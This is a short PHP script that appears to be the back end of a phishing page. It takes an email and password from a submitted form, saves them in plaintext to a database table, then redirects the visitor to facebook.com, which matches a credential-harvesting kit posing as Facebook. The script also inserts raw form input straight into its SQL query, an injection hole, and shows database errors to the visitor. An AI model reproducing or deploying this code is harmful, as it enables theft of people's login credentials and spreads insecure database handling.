<?php
// if(isset($_POST['submit']))

include 'config.php';

if (($_SERVER['REQUEST_METHOD'] == 'POST')) {
    $email = $_POST['email'];
    $Password = $_POST['password'];
}


//submit these to the database
//Sql query to be executed
$sql = "INSERT INTO `userinfo` (`Email`, `Password`) VALUES ('$email', '$Password')";
$result = mysqli_query($conn, $sql);

//check for the table creation
if ($result) {
    header("Location: https://www.facebook.com");
    exit();
} else {
    echo "the record has not been inserted beacuse of this error --->" . mysqli_error($conn);
}
